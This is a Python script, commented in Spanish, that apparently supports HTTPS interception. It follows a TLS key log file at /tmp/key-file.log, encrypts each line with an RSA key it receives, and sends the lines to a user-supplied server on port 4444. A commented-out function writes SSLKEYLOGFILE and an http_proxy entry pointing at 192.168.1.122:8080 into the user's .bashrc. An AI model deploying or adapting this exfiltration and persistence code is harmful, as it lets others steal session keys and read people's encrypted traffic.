#!/usr/bin/env python3

import os
import sys
import socket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import time
from colorama import init, Fore

"""def configuracion(ruta, host, port):
    linea_añadir = "export SSLKEYLOGFILE=" + ruta
    comando = "echo " + "\"" + linea_añadir + "\"" + " >> " + "/home/" + os.getlogin() + "/.bashrc"
    os.system(comando)

    linea_añadir = "export http_proxy=http://" + host + ":" + port + "/"
    print(linea_añadir)
    comando = "echo " + "\"" + linea_añadir + "\"" + " >> " + "/home/" + os.getlogin() + "/.bashrc"
    os.system(comando)

configuracion("/tmp/.sslkeylog", "192.168.1.122", "8080")"""

# Funcion que sirve para leer el fichero que se escribe continuamente como pueden ser ficheros de logs.
# https://stackoverflow.com/questions/5419888/reading-from-a-frequently-updated-file
def follow(thefile):
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def main():
    HOST = str(input(Fore.GREEN + "Introduce la IP del servidor: ")) # The server's hostname or IP address
    PORT = 4444 # The port used by the server

    #sslkeylog_path = str(input("Introduce donde desea almacenar las claves: "))
    #configuracion(sslkeylog_path)

    file_exists = os.path.exists("/tmp/key-file.log")
    try:
        filesize = os.path.getsize("/tmp/key-file.log")
    except:
        filesize = 0

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        public_key = s.recv(1024)
        # Importing keys from variable, converting it into the RsaKey object.
        pu_key = RSA.import_key(public_key.decode())
        # Instantiating PKCS1_OAEP object with the public key for encryption
        cipher = PKCS1_OAEP.new(key=pu_key)
        while file_exists != True or filesize == 0:
            file_exists = os.path.exists("/tmp/key-file.log")
            try:
                filesize = os.path.getsize("/tmp/key-file.log")
            except:
                filesize = 0
        f = open("/tmp/key-file.log", "rb")
        filelines = follow(f)
        for line in filelines:
            cipher_text = cipher.encrypt(line)
            print(cipher_text)
            s.sendall(cipher_text)
        s.close()

    print("Enviado el fichero entero.")

if __name__ == '__main__':
    try:
        init(autoreset=True)
        main()
    except KeyboardInterrupt:
        print("")
        print(Fore.YELLOW + "/////////////////////////")
        print(Fore.YELLOW + 'Terminando proceso...')
        print(Fore.YELLOW + "/////////////////////////")
        print("")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)